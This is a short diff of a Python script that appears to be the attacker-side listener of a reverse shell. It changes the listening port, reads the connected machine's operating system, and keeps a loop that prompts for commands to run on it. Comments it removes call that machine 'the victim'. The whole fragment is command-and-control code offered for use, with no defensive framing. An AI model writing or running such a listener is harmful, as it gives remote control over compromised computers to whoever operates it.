@@ -2,7 +2,7 @@ import socket
 import os
 
 SERVER_HOST = "0.0.0.0"
-SERVER_PORT = 5003
+SERVER_PORT = 6154
 
 BUFFER_SIZE = 5120
 
@@ -14,10 +14,10 @@ s.listen(5)
 print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")
 
 client_socket, client_address = s.accept()
-print(f"{client_address[0]}:{client_address[1]} Connected!")
+print(f"{client_address[0]}:{client_address[1]} Connected! \n")
 
-#todo: take input for what operating system is the victim
-#todo: take input for what terminal it wants to open 
+platform = client_socket.recv(BUFFER_SIZE).decode()
+print(f"Seems to be a {platform} machine")
 
 while True:
     command = input("Enter the command you wanna execute:")
